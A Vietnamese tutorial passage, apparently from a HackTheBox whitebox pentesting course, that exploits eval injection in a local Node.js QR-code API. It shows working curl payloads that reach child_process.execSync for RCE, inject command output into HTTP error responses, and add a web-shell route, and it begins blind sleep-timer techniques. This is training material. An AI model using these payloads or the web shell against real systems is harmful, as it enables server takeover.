#### **Gửi yêu cầu kiểm tra cơ bản:**

Để kiểm tra cơ bản, bạn có thể gửi một yêu cầu **POST** tới endpoint `/api/service/generate`, bao gồm chuỗi văn bản cần tạo mã QR. Ví dụ:
```bash
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"text": "this is a test"}' http://localhost:5000/api/service/generate
```

Kết quả sẽ trả về một mã QR dưới dạng chuỗi base64, ví dụ:
```html
<img src="data:image/png;base64,iVBORw0KGgo...SNIP...5ErkJggg==" alt="QR Code" />
```

Đây là dấu hiệu cho thấy yêu cầu đã được thực hiện thành công và hàm `generateQR` đã hoạt động chính xác.

---

### **4. Gỡ lỗi hàm `validateString`**

Khi chúng ta đã xác nhận rằng mã QR đã được tạo thành công, chúng ta có thể thử nghiệm sâu hơn với hàm `validateString`. Để làm điều này, chúng ta sẽ chạy ứng dụng trong chế độ gỡ lỗi và đặt một **breakpoint** trong hàm `validateString`.

#### **Chạy ứng dụng trong chế độ gỡ lỗi:**
- Sử dụng môi trường phát triển của **VSCode** và chuyển đến tab **Run and Debug**. Sau đó, nhấp vào biểu tượng **Run** bên cạnh cấu hình **Launch Program** để bắt đầu ứng dụng trong chế độ gỡ lỗi.
- Sau khi ứng dụng chạy, quay lại tệp `controllers/service-controllers.js` và thêm một breakpoint tại dòng 4 trong hàm `validateString`. Khi breakpoint được thiết lập, một chấm đỏ sẽ xuất hiện bên cạnh dòng mã.

#### **Kiểm tra giá trị các biến:**
- Gửi lại yêu cầu **POST** trước đó, và ứng dụng sẽ dừng tại breakpoint. Bạn có thể kiểm tra các giá trị của các biến trong phần **VARIABLES** ở bên trái của VSCode.
- Điều này cho phép bạn xem liệu đầu vào của bạn có đúng với mong đợi không và giúp kiểm tra các thay đổi của biến trong suốt quá trình thực thi.

---

### **5. Tìm hiểu về lỗ hổng "Eval Injection"**

Vì hàm `validateString` sử dụng **`eval`**, đây là một vấn đề bảo mật tiềm ẩn mà chúng ta cần kiểm tra kỹ. **Injection vào eval** có thể cho phép kẻ tấn công thực thi mã JavaScript độc hại, và điều này cần phải được kiểm tra thêm.

Trong bước tiếp theo, chúng ta sẽ tập trung vào **kiểm tra lỗ hổng "Eval Injection"** và xem liệu có thể khai thác lỗ hổng này hay không.

---

# 9.Tấn công Eval Injection

Trong các bài kiểm thử bảo mật Whitebox, chúng ta sẽ sử dụng những kỹ năng và kiến thức thu được từ các lỗ hổng khác nhau mà mình đã học, bao gồm các mô-đun trong HackTheBox Academy và kinh nghiệm thực tế. Mỗi chức năng được lựa chọn có thể bị ảnh hưởng bởi một lỗ hổng bảo mật khác nhau, vì vậy càng hiểu rõ nhiều lỗ hổng, chúng ta càng có thể phát hiện ra nhiều lỗ hổng tiềm ẩn.

Trong bài viết này, chúng ta sẽ tìm hiểu về **Eval Injection** (tấn công chèn mã qua `eval`), một lỗ hổng bảo mật có thể xảy ra trong các ứng dụng sử dụng chức năng `eval`. Đây là một trong những lỗ hổng nguy hiểm, bởi vì một kẻ tấn công có thể chèn mã JavaScript vào ứng dụng và khiến mã này được thực thi trên máy chủ.

---

### **1. Tổng quan về lỗ hổng Code Injection**

**Code Injection** xảy ra khi dữ liệu người dùng được đưa vào ứng dụng và được xử lý mà không được kiểm tra, vệ sinh đúng cách. Điều này cho phép kẻ tấn công chèn thêm mã vào ứng dụng, dẫn đến các hành vi không mong muốn, như việc chạy mã độc.

#### **Các dạng lỗ hổng Injection:**
- **SQL Injection**: Dữ liệu người dùng ảnh hưởng đến câu truy vấn SQL.
- **Command Injection**: Dữ liệu người dùng ảnh hưởng đến câu lệnh hệ thống được thực thi.
- **Code Injection**: Dữ liệu người dùng có thể được thực thi như mã nguồn trong các ngôn ngữ như JavaScript hoặc Python.

Trong các ứng dụng web, tấn công **Eval Injection** có thể đặc biệt nguy hiểm nếu ứng dụng sử dụng hàm `eval` hoặc các hàm tương tự để thực thi mã JavaScript từ các chuỗi văn bản.

---

### **2. Hàm `eval` và mối nguy cơ Eval Injection**

Hàm `eval` trong JavaScript là một hàm rất mạnh mẽ, vì nó cho phép thực thi bất kỳ chuỗi nào được truyền vào dưới dạng mã JavaScript. Tuy nhiên, đây cũng là một hàm tiềm ẩn nguy cơ bảo mật, vì kẻ tấn công có thể lợi dụng điều này để chèn mã JavaScript độc hại vào ứng dụng.

#### **Ví dụ về `eval` injection:**

Giả sử có đoạn mã sau:
```javascript
eval("var i = '" + input + "'");
```
Trong trường hợp này, nếu `input` không được kiểm tra và vệ sinh cẩn thận, kẻ tấn công có thể chèn mã vào trong chuỗi, ví dụ:
```
'; console.log("pwned"); ';
```

Với mã đầu vào này, `eval` sẽ thực thi:
```javascript
var i = '';
console.log("pwned");
```

Đoạn mã `console.log("pwned");` sẽ được thực thi, và điều này có thể gây hại nếu kẻ tấn công chèn mã lệnh độc hại.

---

### **3. Kiểm tra `validateString`**

Trong ứng dụng của chúng ta, hàm `validateString` có thể là điểm yếu tiềm ẩn, vì nó gọi hàm `eval` với một chuỗi chứa dữ liệu người dùng chưa được kiểm tra.

```javascript
function validateString(input, onError) {
    if (...SNIP...) {
        eval(onError);
        return false;
    }
    return true;
}
```

Hàm `onError` được truyền vào `eval` có thể chứa dữ liệu người dùng, như trong ví dụ sau:
```javascript
role === "admin"
  ? `throw({message: 'The input "${text}" contains the following invalid characters: [${text.match(/['"`;]/g)]}', statusCode: 403})`
  : "throw({message: 'Invalid input', statusCode: 403})";
```

Nếu `role` là `"admin"`, chuỗi `"${text}"` sẽ được chèn trực tiếp vào trong câu lệnh `eval`. Điều này cho phép kẻ tấn công chèn mã JavaScript vào trong chuỗi thông qua giá trị của `text`.

### **4. Kiểm tra và khai thác lỗ hổng Eval Injection**

Để khai thác lỗ hổng này, kẻ tấn công cần có quyền **admin** trong ứng dụng. Khi đó, họ có thể gửi dữ liệu đầu vào có chứa mã JavaScript độc hại vào hàm `validateString`, qua đó thực thi mã độc trên máy chủ.

#### **Ví dụ payload:**
Giả sử chúng ta có quyền `admin` và gửi chuỗi sau làm đầu vào:
```
"; console.log('code injection'); //"
```
Kết quả là:
```javascript
eval("var i = ''; console.log('code injection'); ''");
```
Điều này sẽ thực thi mã `console.log('code injection')`, có thể dễ dàng mở rộng để thực thi mã độc hại, ví dụ như chèn một lệnh để xóa dữ liệu hoặc tạo một cửa hậu (backdoor).

---

### **5. Phòng ngừa và bảo vệ khỏi Eval Injection**

Để phòng ngừa lỗ hổng Eval Injection, có một số cách tiếp cận:

1. **Không sử dụng `eval`**: Tránh sử dụng hàm `eval` nếu không cần thiết. Hãy thay thế nó bằng các phương pháp an toàn hơn, chẳng hạn như `JSON.parse()` cho dữ liệu JSON hoặc `Function` constructors nếu cần thiết.
   
2. **Vệ sinh dữ liệu đầu vào**: Mọi đầu vào từ người dùng cần phải được kiểm tra và vệ sinh cẩn thận. Điều này có thể bao gồm việc loại bỏ các ký tự đặc biệt hoặc sử dụng các hàm mã hóa trước khi đưa vào các câu lệnh `eval`.

3. **Sử dụng các công cụ bảo mật**: Có thể sử dụng các công cụ như **Content Security Policy (CSP)** để hạn chế việc thực thi mã JavaScript từ các nguồn không đáng tin cậy.

4. **Thực hiện kiểm thử bảo mật thường xuyên**: Kiểm thử các điểm yếu bảo mật trong mã nguồn thông qua phương pháp **Static Analysis** (Phân tích tĩnh mã nguồn) và **Dynamic Testing** (Kiểm thử động).

---


# 10. Bước Tiếp Theo: Xác định Lỗ Hổng và Lập Kế Hoạch Tấn Công

Khi đã xác định được điểm yếu trong ứng dụng hoặc chức năng mà chúng ta muốn kiểm thử, bước tiếp theo là lập kế hoạch tấn công. Đây là một giai đoạn quan trọng nhằm đảm bảo mọi yêu cầu cần thiết để khai thác lỗ hổng đều được thực hiện đúng cách. Dưới đây là quy trình chi tiết:

---

#### 1. **Lập Kế Hoạch Tấn Công**

Khi chúng ta muốn thực hiện một cuộc tấn công nhằm xâm nhập vào hàm `validateString` hoặc hàm `eval` của ứng dụng, cần có kế hoạch rõ ràng cho từng giai đoạn. Điều này giúp chúng ta dễ dàng theo dõi tiến độ và xác định nơi có thể phát sinh vấn đề. Quy trình cụ thể như sau:

- **Các bước cần thực hiện**:
  - **Trace (theo dõi) cách đầu vào được xử lý trong hàm**:
    - Điều này giúp hiểu được đầu vào của chúng ta có được truyền qua đúng cách hay không.
  - **Có được quyền quản trị (admin role)**:
    - Nếu không có quyền quản trị, chúng ta cần khai thác một lỗ hổng như XSS, CSRF hoặc các phương pháp khác để có quyền quản trị.
  - **Xác nhận hàm `eval` có được gọi hay không**:
    - Kiểm tra để đảm bảo rằng lệnh `eval` sẽ được gọi khi đầu vào của hàm `validateString` hợp lệ.
  - **Chuẩn bị payload**:
    - Viết payload mã độc để khai thác lỗ hổng.
  - **Xác nhận payload đã đến hàm đích**:
    - Gửi yêu cầu với payload để kiểm tra có được thực thi hay không.
  - **Tiến hành code injection**:
    - Bơm mã độc vào hàm `eval` hoặc `onError`.
  - **Xác nhận thực thi mã độc**:
    - Kiểm tra xem mã độc có thực sự được thực thi hay không.
  - **Xác minh lệnh thực thi (command execution)/ghi tệp tin (file writing)**:
    - Xem xét các tác động khi thực thi mã độc.
  - **Tự động hóa quá trình tấn công**:
    - Viết script để tự động thực hiện các bước trên.

---

#### 2. **Có được Quyền Quản Trị (Admin Role)**

Trong thực tế, có nhiều cách để có được quyền quản trị trong một ứng dụng web, bao gồm:
- **Tấn công lợi thế quyền (Privilege Escalation) thông qua một lỗ hổng**.
- **Quá trình ủy quyền (Authorization flow)**.
- **Tấn công XSS/CSRF đối với người dùng quản trị**.
- **Brute force tài khoản quản trị**.

Nếu không có bất kỳ phương pháp nào để có được quyền quản trị, chúng ta có thể yêu cầu quyền quản trị từ người quản trị hệ thống. Tuy nhiên, mức độ tác động của lỗ hổng sẽ thấp hơn vì chỉ ảnh hưởng đến một số ít người dùng có tài khoản quản trị.

Trường hợp của chúng ta, để tránh phải sử dụng nhiều lỗ hổng và giữ tập trung vào quy trình kiểm thử hộp trắng, chúng ta sẽ sử dụng tùy chọn cuối cùng: sử dụng email có đuôi `.hackthebox.com` để có được quyền quản trị. Cụ thể:

- Lập lại yêu cầu trước đó để có được mã thông báo ủy quyền, nhưng lần này thay đổi email thành `.hackthebox.com`:
  ```bash
  curl -s -X POST -H "Content-Type: application/json" -d '{"email": "[email protected]"}' http://localhost:5000/api/auth/authenticate
  ```
  Kết quả:
  ```json
  {"token":"eyJhbGciOiJIUzI1N...SNIP...9R6zeoubrQTbUiThBpeQD7_DWibgo"}
  ```
- Sử dụng trang web như `jwt.io` để đọc giá trị role (quyền) được lấy từ mã JSON Web Token (JWT) và xác nhận chúng ta đã có quyền quản trị.

---

#### 3. **Đến Được Hàm Mã Hóa (Reaching the Vulnerable Code)**

Trở lại hàm `validateString` trong ứng dụng để xem cách chúng ta có thể tiếp cận đoạn mã lỗ hổng:

```javascript
function validateString(input, onError) {
  if (
    typeof input !== "string" ||
    input.length == 0 ||
    input.match(/['"`;]/g)
  ) {
    eval(onError);
    return false;
  }
  return true;
}
```

Hàm `eval` chỉ được gọi khi một hoặc nhiều điều kiện sau được thỏa mãn:
1. **Đầu vào không phải là chuỗi (ví dụ: số hoặc đối tượng)**
2. **Độ dài của đầu vào là 0**
3. **Đầu vào khớp với biểu thức chính quy đã chỉ định**

Tuy nhiên, nếu chúng ta sử dụng chuỗi rỗng hoặc thứ gì đó khác ngoài chuỗi, thì không có cách nào để bơm mã vào `onError` của hàm `eval`. Do đó, phương án duy nhất chúng ta có thể sử dụng là các ký tự xấu đã chỉ định (ví dụ: dấu chấm phẩy `;`).

Payload JSON của chúng ta sẽ là:
```json
{"text": ";"}
```

Khi chúng ta gửi yêu cầu này, chúng ta sẽ nhận được phản hồi sau:
```bash
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...9R6zeoubrQTbUiThBpeQD7_DWibgo" -d '{"text": ";"}' http://localhost:5000/api/service/generate
```
Kết quả:
```json
{"message":"Đầu vào \";\" chứa các ký tự không hợp lệ: [;]"}
```

Và đây là thông báo lỗi chi tiết từ máy chủ, cho thấy rằng chúng ta đã tiếp cận thành công hàm `eval` và `onError` mà không làm gián đoạn ứng dụng.

---

Tiếp theo, chúng ta sẽ chuẩn bị payload để bơm mã độc vào hàm `eval`.

Sau khi chúng ta đã xác định được lỗ hổng trong hàm `validateString` và cách để đến được đoạn mã lỗ hổng, bước tiếp theo là chuẩn bị payload để bơm mã độc vào hàm `eval`.

### Chuẩn Bị Payload Mã Độc

1. **Xác định ký tự mà chúng ta có thể sử dụng**:
   - Dựa trên điều kiện mà hàm `validateString` kiểm tra, chúng ta có thể sử dụng ký tự `;` để bơm mã vào `onError` vì nó không làm gián đoạn ứng dụng.

2. **Payload JSON**:
   ```json
   {
     "text": ";"
   }
   ```

3. **Gửi yêu cầu với payload**:
   - Sử dụng công cụ `curl` hoặc công cụ tương tự để gửi yêu cầu POST tới ứng dụng:
     ```bash
     curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...9R6zeoubrQTbUiThBpeQD7_DWibgo" -d '{"text": ";"}' http://localhost:5000/api/service/generate
     ```

4. **Kết quả trả về**:
   ```json
   {"message":"Đầu vào \";\" chứa các ký tự không hợp lệ: [;]"}
   ```
   - Thông báo này cho thấy chúng ta đã đến được hàm `eval` và `onError` thành công, mà không làm gián đoạn ứng dụng.

### Tại sao sử dụng ký tự `;` là an toàn hơn?
- **Ký tự `;`** giúp chúng ta tránh được việc rơi vào các điều kiện ngoại lệ trong ứng dụng vì nó không làm thay đổi cấu trúc mã nguồn của đoạn mã `onError` hiện tại.
- Bằng cách sử dụng ký tự `;`, chúng ta có thể lồng mã độc vào đúng chỗ mà không cần thay đổi quá nhiều mã nguồn hiện tại.

---

#### Kế Tiếp: Sau khi đã chuẩn bị payload, bước tiếp theo là xác nhận payload đã đến đúng hàm `validateString` và thực hiện việc bơm mã độc vào đó.

Sau khi chuẩn bị payload với ký tự `;` để bơm mã độc vào hàm `validateString`, bước tiếp theo là xác nhận rằng payload đã đến đúng hàm `validateString` và thực hiện việc bơm mã độc vào đó.

### Bước 4: Xác nhận Payload đã Đến Đúng Hàm `validateString`

1. **Gửi yêu cầu với payload JSON đã chuẩn bị**:
   - Sử dụng công cụ `curl` hoặc công cụ tương tự:
     ```bash
     curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...9R6zeoubrQTbUiThBpeQD7_DWibgo" -d '{"text": ";"}' http://localhost:5000/api/service/generate
     ```
2. **Phản hồi nhận được**:
   ```json
   {"message":"Đầu vào \";\" chứa các ký tự không hợp lệ: [;]"}
   ```
   - Thông báo này cho thấy rằng chúng ta đã thành công trong việc đưa payload đến hàm `validateString`.

### Bước 5: Bơm Mã Độc vào Hàm `validateString`

Tiếp theo, chúng ta sẽ sử dụng payload đã chuẩn bị và thực hiện việc bơm mã độc vào hàm `eval` thông qua `validateString`:

1. **Payload JSON**:
   ```json
   {
     "text": "alert('Hello, world!');"
   }
   ```

2. **Gửi yêu cầu với payload bơm mã độc**:
   - Sử dụng công cụ `curl` hoặc công cụ tương tự:
     ```bash
     curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...9R6zeoubrQTbUiThBpeQD7_DWibgo" -d '{"text": "alert(\'Hello, world!\');"}' http://localhost:5000/api/service/generate
     ```
3. **Kết quả nhận được**:
   - Nếu ứng dụng phản hồi không có lỗi mà vẫn tiếp tục thực hiện mã độc như chúng ta mong muốn, điều đó có nghĩa là mã độc đã được bơm thành công vào ứng dụng thông qua `eval`.

### Bước 6: Xác minh Mã Độc đã Thực Thi

Để xác nhận mã độc đã thực thi, bạn có thể sử dụng các công cụ kiểm tra và log kết quả. Ví dụ:
- Kiểm tra trang console (nếu ứng dụng chạy với `console.log`)
- Sử dụng công cụ theo dõi mạng (network inspector) để xác nhận việc thực thi mã độc.
- Thực hiện kiểm tra thêm nếu cần.

---

# 11. Thử Nghiệm Tiêm Mã (Code Injection)

Mục tiêu của chúng ta là tiêm mã vào ứng dụng qua lỗ hổng trong hàm `eval` bằng cách gửi một payload đơn giản, như một hàm `console.log`, để kiểm tra xem mã có thực thi thành công hay không. Chúng ta sẽ đi qua các bước thử nghiệm sau:

### Bước 1: Tạo Payload Tiêm Mã

Chúng ta sẽ sử dụng một payload đơn giản để thử nghiệm việc tiêm mã vào ứng dụng, với mục tiêu là kiểm tra log đầu ra trong console của Node. Để làm điều này, chúng ta sẽ thêm ký tự chấm phẩy `;` sau dấu đóng ngoặc của hàm để bắt đầu một dòng mã mới và thêm mã tiêm vào sau đó.

**Payload Tiêm Mã**:
```json
{
  "text": "'}); console.log('pwned')//"
}
```

### Bước 2: Gửi Yêu Cầu

Sau khi tạo payload, chúng ta sẽ gửi yêu cầu tới endpoint `/api/service/generate` để kiểm tra xem có gì xảy ra.

**Lệnh `curl`**:
```bash
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...9R6zeoubrQTbUiThBpeQD7_DWibgo" -d "{ \"text\": \"'}); console.log('pwned')//\" }" http://localhost:5000/api/service/generate
```

**Phản hồi**:
```json
{"message":"Could not generate QR code."}
```

Chúng ta nhận được thông báo lỗi như mong đợi, nhưng khi kiểm tra trong Debug Console của VSCode (CMD/CTRL+SHIFT+Y), không có gì được ghi vào console. Điều này có nghĩa là việc tiêm mã chưa thành công. Bây giờ, chúng ta cần debug để xác định nguyên nhân.

### Bước 3: Debugging

Để chắc chắn rằng payload của chúng ta đã đến đúng hàm `eval` và bị xử lý như dự định, chúng ta cần thiết lập một breakpoint tại hàm `eval` (dòng 9) và kiểm tra giá trị của `onError`.

1. **Thiết lập Breakpoint**: Đặt breakpoint tại dòng 9 trong mã nguồn và gửi lại yêu cầu với payload.
2. **Kiểm tra giá trị `onError`**: Chúng ta thấy rằng giá trị của `onError` là:
   ```javascript
   throw { message: 'The input "' }; console.log('pwned'); //" contains the following invalid characters: [',']', statusCode: 403})
   ```
   Đây là mã mà chúng ta mong đợi. Không có gì sai với payload đã gửi.

### Bước 4: Xác Định Nguyên Nhân Mã Không Chạy

Tại sao mã tiêm không chạy? Nếu sao chép đoạn mã này vào một file JavaScript mới và xem qua cú pháp, bạn sẽ nhận thấy rằng phần mã sau câu lệnh `throw` bị mờ (transparent). Điều này có nghĩa là mã sau câu lệnh `throw` sẽ không bao giờ được thực thi. Câu lệnh `throw` dừng thực thi mã và trả về thông báo lỗi.

### Bước 5: Sửa Lỗi và Tiêm Mã Thành Công

Để mã của chúng ta được thực thi, chúng ta cần thay thế dấu chấm phẩy `;` trong payload bằng dấu cộng `+`. Dấu cộng trong JavaScript hoạt động tương tự như toán tử `&&` trong bash, cho phép nối các câu lệnh để chúng được thực thi liên tiếp.

**Payload Mới**:
```json
{
  "text": "'}) + console.log('pwned')//"
}
```

Gửi lại yêu cầu với payload mới.

**Lệnh `curl`**:
```bash
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...9R6zeoubrQTbUiThBpeQD7_DWibgo" -d "{ \"text\": \"'} + console.log('pwned')//\" }" http://localhost:5000/api/service/generate
```

**Kết quả**:
Khi gửi yêu cầu, bạn sẽ thấy thông điệp "pwned" được ghi vào console của Node, chứng tỏ rằng mã tiêm đã thành công.

### Bước 6: Xác Nhận Lỗ Hổng

Với việc tiêm mã thành công, chúng ta đã chứng minh được rằng ứng dụng có lỗ hổng trong việc xử lý đầu vào và cho phép tiêm mã qua `eval`. 

### Kiểm Tra Lại Kế Hoạch Tấn Công

Chúng ta có thể kiểm tra lại kế hoạch tấn công và đánh dấu các bước đã hoàn thành:

- [x] Truy cập hàm `validateString`
- [x] Xác nhận cách thức dữ liệu được xử lý trong hàm
- [x] Đạt được quyền admin
- [x] Xác nhận rằng mã đến được hàm `eval`
- [x] Chuẩn bị payload
- [x] Xác nhận payload đến đúng hàm
- [x] Tiêm mã và xác nhận việc tiêm mã thành công
- [ ] Đạt được thực thi lệnh hoặc ghi tệp
- [ ] Kiểm tra thực thi lệnh/ghi tệp
- [ ] Tự động hóa quá trình khai thác

Chúng ta đã xác nhận được lỗ hổng tiêm mã và chuẩn bị bước tiếp theo để thử khai thác lỗ hổng này thành các cuộc tấn công có thể thực thi lệnh hoặc ghi tệp.

---

# 12. Thực Thi Lệnh (Command Execution)

Sau khi xác nhận rằng chúng ta có thể tiêm mã vào ứng dụng, mục tiêu tiếp theo là tối đa hóa khả năng khai thác lỗ hổng này và tiến tới thực thi lệnh từ xa (remote code execution, RCE), điều này sẽ giúp chúng ta đạt được mục tiêu khai thác lỗ hổng. Hướng đi tiếp theo là đạt được khả năng thực thi lệnh hệ thống thông qua mã JavaScript.

### Bước 1: Tiêm Mã để Thực Thi Lệnh

Chúng ta đã biết rằng khi mã được tiêm vào ứng dụng, có thể sử dụng hàm `require("child_process").execSync()` để thực thi lệnh hệ thống trong Node.js. Để kiểm tra khả năng thực thi lệnh, ta sẽ tạo một tệp mới gọi là `pwned` trong thư mục làm việc của hệ thống:

**Payload để Tiêm Mã**:
```json
{
  "text": "'}) + require('child_process').execSync('touch pwned')//"
}
```

Gửi yêu cầu với payload trên và kiểm tra thư mục của ứng dụng để xác nhận rằng tệp `pwned` đã được tạo.

**Lệnh cURL**:
```bash
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...9R6zeoubrQTbUiThBpeQD7_DWibgo" -d "{ \"text\": \"'} + require('child_process').execSync('touch pwned')//\" }" http://localhost:5000/api/service/generate
```

**Kết Quả**: Tệp `pwned` đã được tạo trong thư mục của hệ thống, chứng tỏ rằng chúng ta đã thực thi thành công lệnh hệ thống từ xa.

### Bước 2: Lấy Kết Quả của Lệnh Thực Thi

Khi thực thi lệnh trên, chúng ta cần một phương pháp để nhận kết quả từ lệnh mà không có quyền truy cập vào backend. Một số phương pháp khả thi để lấy kết quả của lệnh bao gồm:

1. **Log kết quả ra console (cho kiểm tra nội bộ)**: Dễ dàng nhưng không có giá trị thực tế nếu không có quyền truy cập vào console của server.
2. **Reverse Shell**: Không khả thi nếu server ngăn chặn kết nối đi ra ngoài.
3. **Exfiltration qua HTTP (GET hoặc POST request)**: Bị giới hạn nếu không có khả năng gửi dữ liệu ra ngoài.
4. **Exfiltration qua DNS**: Không khả thi nếu không có kết nối internet.
5. **Lưu kết quả vào cơ sở dữ liệu**: Không thể áp dụng vì ứng dụng không sử dụng cơ sở dữ liệu.
6. **Ghi kết quả vào tệp và truy cập từ xa**: Là một giải pháp khả thi nếu có thể viết vào tệp trong thư mục có quyền truy cập công khai.
7. **Inject kết quả vào phản hồi HTTP**: Một cách tốt để trực tiếp trả kết quả lệnh cho client.

### Bước 3: Tìm Cách Lấy Kết Quả

Khi kiểm tra khả năng ghi kết quả vào tệp, chúng ta cần phải xác minh rằng ứng dụng có thể ghi vào một thư mục có quyền truy cập công khai. Tuy nhiên, ứng dụng không có thư mục công khai (`./public`) như thông thường. 

Một cách khác là thay vì ghi vào tệp công khai, chúng ta có thể thay đổi mã nguồn của ứng dụng, thêm một route API mới (ví dụ: `/api/cmd`), và sử dụng nó như một web shell đơn giản để thực thi lệnh và trả kết quả.

**Ví Dụ Mã Tạo Web Shell**:
```javascript
app.get("/api/cmd", (req, res) => {
  const cmd = require("child_process").execSync(req.query.cmd).toString();
  res.send(cmd);
});
```

**Giải Pháp Khác**:
Nếu không thể thay đổi mã nguồn của ứng dụng, chúng ta có thể thử lợi dụng các lỗ hổng có sẵn trong hệ thống (nếu có) như Local File Inclusion (LFI), SQL Injection, hay các lỗ hổng đọc tệp khác.

### Bước 4: Lựa Chọn Phương Pháp Khai Thác

Sau khi kiểm tra các phương án, có thể lựa chọn giữa:

1. **Ghi kết quả vào một tệp trong thư mục có quyền truy cập công khai**: Nếu ứng dụng cho phép ghi vào các thư mục có thể truy cập công khai, chúng ta có thể ghi kết quả vào một tệp trong đó và đọc kết quả qua HTTP.
2. **Inject kết quả vào phản hồi HTTP**: Một cách khác là trả kết quả trực tiếp qua một API endpoint mà chúng ta có thể truy cập từ client.

Chúng ta sẽ cần thử nghiệm thêm các cách tiếp cận này để đảm bảo rằng kết quả của lệnh thực thi có thể được truy cập từ xa, nhằm tiếp tục khai thác lỗ hổng này.

---

# 13. Tiêm Phản Hồi HTTP (HTTP Response Injection)

Bây giờ, sau khi xác nhận rằng lỗ hổng code injection đã được khai thác thành công và có thể thực thi các lệnh hệ thống, bước tiếp theo là cố gắng khai thác lỗ hổng này để lấy kết quả của các lệnh thực thi từ xa qua phản hồi HTTP.

### Phân Tích Phản Hồi HTTP
Dựa trên mã nguồn của ứng dụng, chúng ta biết rằng các phản hồi có thể nhận được từ endpoint `/generate` bao gồm:

1. **403 - Unauthorized** (Không có quyền)
2. **403 - Invalid input (non admins)** (Dữ liệu không hợp lệ - người dùng không phải admin)
3. **403 - verbose message (admins)** (Thông báo chi tiết cho admin)
4. **500 - Could not generate QR code** (Lỗi chung)

Do yêu cầu của ứng dụng yêu cầu quyền admin để có thể đi đến đoạn mã có lỗ hổng, ta sẽ bỏ qua 2 phản hồi đầu tiên. Ta cũng đã thấy phản hồi lỗi 500 trong các thử nghiệm trước và không thể chèn kết quả lệnh vào đó vì nó là văn bản tĩnh. Do đó, ta sẽ tập trung vào phản hồi với mã 403, nơi có thể xuất hiện thông báo chi tiết khi người dùng có quyền admin.

### Kiểm Tra Lỗi 500
Tuy nhiên, chúng ta đang nhận được lỗi 500 mỗi khi gửi yêu cầu tiêm mã. Chúng ta cần hiểu lý do tại sao không nhận được thông báo chi tiết và tại sao lệnh của chúng ta không được thực thi.

Trong mã nguồn, phần `catch` của ứng dụng có đoạn sau:

```javascript
try {
  // ... code xử lý ...
} catch (e) {
  if (e.statusCode === 403) {
    return next(e);
  } else {
    return next({
      message: "Could not generate QR code.",
      statusCode: 500,
    });
  }
}
```

Để có thể nhận được thông báo chi tiết từ phản hồi, mã tiêm của chúng ta cần phải đưa ra một lỗi có mã trạng thái là `403`. Nếu không, ứng dụng sẽ quay lại thông báo mặc định với mã 500, và chúng ta không thể tiêm kết quả lệnh vào trong đó.

### Tiêm Mã Để Thêm `statusCode: 403`
Chúng ta sẽ thử gửi một yêu cầu với payload tiêm mã đơn giản để tạo ra thông báo với `statusCode` là 403. Đây là cách payload sẽ trông như thế này:

```json
{
  "text": "test message', statusCode: 403})//"
}
```

Gửi yêu cầu này sẽ khiến thông báo `test message` được hiển thị trong phản hồi:

```bash
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...1YLEvDs4SR7RHfQ" -d "{ \"text\": \"test message', statusCode: 403})//\" }" http://localhost:5000/api/service/generate
```

**Kết quả**: Phản hồi hiển thị `"message": "The input \"test message"`.

### Tiêm Kết Quả Lệnh vào Phản Hồi
Giờ chúng ta có thể tiến hành tiêm kết quả từ lệnh hệ thống vào thông báo lỗi này. Dưới đây là payload mới sẽ tiêm mã JavaScript vào phản hồi:

```json
{
  "text": "' + require('child_process').execSync('ls').toString() + `', statusCode: 403})//"
}
```

Chúng ta sử dụng dấu backtick (`` ` ``) thay vì dấu nháy đơn để tránh gặp phải vấn đề thoát ký tự trong JSON và dễ dàng tránh lỗi trong cấu trúc của câu lệnh.

**Lệnh cURL** sẽ trông như sau:

```bash
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1N...SNIP...1YLEvDs4SR7RHfQ" -d "{ \"text\": \"' + require('child_process').execSync('ls').toString() + \`', statusCode: 403})//\" }" http://localhost:5000/api/service/generate
```

**Kết quả**:

```json
{
  "message": "The input \"node_modules\npackage-lock.json\npackage.json\nsrc\n'"
}
```

Chúng ta đã thành công trong việc tiêm kết quả của lệnh hệ thống vào phản hồi HTTP. Kết quả là danh sách các tệp trong thư mục ứng dụng, cho thấy chúng ta đã thực thi thành công lệnh và có thể nhận được kết quả từ xa thông qua phản hồi HTTP.

---
# 14. Blind Exploitation - Phương Pháp "Sleep Timers" và "Boolean Output"

Trong các tình huống mà phương pháp tiêm mã trả về kết quả không khả thi, chúng ta có thể sử dụng hai kỹ thuật khác để khai thác lỗ hổng: **sleep timers** (bộ hẹn giờ trễ) và **boolean output** (đầu ra boolean).

### 1. **Kỹ Thuật Sleep Timers**
Kỹ thuật này dựa trên ý tưởng cơ bản rằng chúng ta có thể xác định giá trị của các ký tự trong đầu ra của lệnh bằng cách gửi các yêu cầu lặp đi lặp lại và đo thời gian phản hồi. Nếu một ký tự khớp với ký tự mà chúng ta đang kiểm tra, hệ thống sẽ tạm dừng trong một khoảng thời gian xác định (ví dụ, 1 giây). Nếu không, sẽ không có sự trì hoãn nào.

#### Cách hoạt động:
Giả sử ta muốn kiểm tra ký tự đầu tiên trong đầu ra của lệnh hệ thống (ví dụ `ls`). Cách tiếp cận là:

- Gửi một yêu cầu và kiểm tra xem có trì hoãn (delay) không. Nếu có trì hoãn, điều đó có nghĩa là ký tự đầu tiên là đúng.
- Tiếp tục kiểm tra từng ký tự trong chuỗi đầu ra cho đến khi không còn sự trì hoãn nào.

#### Thực hiện bằng cách sử dụng `sleep`:
Với việc sử dụng lệnh hệ thống `sleep`, ta có thể tạo ra một độ trễ trong phản hồi HTTP để xác định ký tự. Ví dụ:

```bash
